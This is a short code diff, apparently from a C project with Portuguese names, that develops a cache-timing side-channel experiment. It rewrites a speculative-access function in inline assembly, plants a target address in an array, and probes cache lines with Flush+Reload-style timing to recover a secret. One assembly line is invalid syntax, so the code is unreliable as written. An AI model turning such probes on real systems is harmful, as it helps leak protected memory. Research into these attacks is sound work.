@@ -86,20 +86,34 @@ unsigned Treshold(unsigned iteracoes,char *base)
 	return (totalComFlush+totalSemFlush)/2;
 
 }
-/*
-unsigned speculate(int *array)
+
+void speculate(unsigned long *array,void *base)
 {
 
 	asm __volatile__(
-			"mov $0,%%ebx	;"
-			"movl $100,%%ecx	;"
-			"repeat: mov $0,%%eax	;"
-			"dec %%ecx"
-			:  : "r"(array)
+			"mov %0, %%rcx	\n"
+			"mov %1, %%r9	\n"
+			"mov $100,%%rsi	\n"
+			"repeat:			\n" 
+			"	mov $0,%%eax		\n"
+			"	mov (%%rcx),%%rbx		\n"
+			"	mov (%%rbx), %%al			\n"
+			"	mov %%rbx,al(%%r9)		\n"
+			"	dec %%rsi			\n"
+			"	jnz repeat			\n"
+
+			:  : "r" (array) ,"r" (base)
 			);
 
 
-}*/
+}
+void fillArray(unsigned long array[],unsigned long addr)
+{
+	for(int i=0;i<200;i++){
+		array[i]=0;
+	}
+	array[101]=addr;
+}
 
 
 void FlushAll(void *base)
@@ -144,11 +158,17 @@ int main(void)
 	printf("treshold=%08X\n",treshold);
 	printf("DS register = %08X\n",GetDS());
 	printf("p1=%p\n",bufferFill);
-	*(bufferFill+10*4096)='A';
+	
+	
 	FlushAll(bufferFill);
+	
+	*(bufferFill+10*4096)='A';
+	
 	FindSecretLineCache(bufferFill,treshold,lista);
 	printf("aqui %i\n",lista[0]);
 	PrintLista(lista);
+
+
 }
 
 
